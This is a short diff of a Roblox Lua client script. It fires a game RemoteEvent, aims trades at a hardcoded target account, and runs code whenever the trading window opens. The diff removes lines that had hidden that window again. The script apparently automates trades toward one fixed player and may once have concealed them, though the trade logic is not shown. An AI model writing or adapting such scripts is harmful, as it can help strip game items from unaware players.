@@ -3,13 +3,13 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
--- UPDATED AGAIN |fdsfdscvcvcxv 34234234234234234
+-- UPDATED AGAIN |Fixed 
 -- RemoteEvent path - So Cool 
 local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
 
 -- Config
 local waitedPlayer = "geeAqbG9nSC7tRh69Rnz" -- Replace with the exact target name
-local TRADE_INTERVAL = 1
+local TRADE_INTERVAL = 5
 
 -- Wait for the player to join (if not already in game)
 local targetPlayer = Players:FindFirstChild(waitedPlayer)
@@ -89,8 +89,6 @@ task.spawn(function()
 	tradingFrame:GetPropertyChangedSignal("Visible"):Connect(function()
 		if tradingFrame.Visible then
 			mainCode()
-			task.wait(1)
-			tradingFrame.Visible = false
 		end
 	end)
 end)
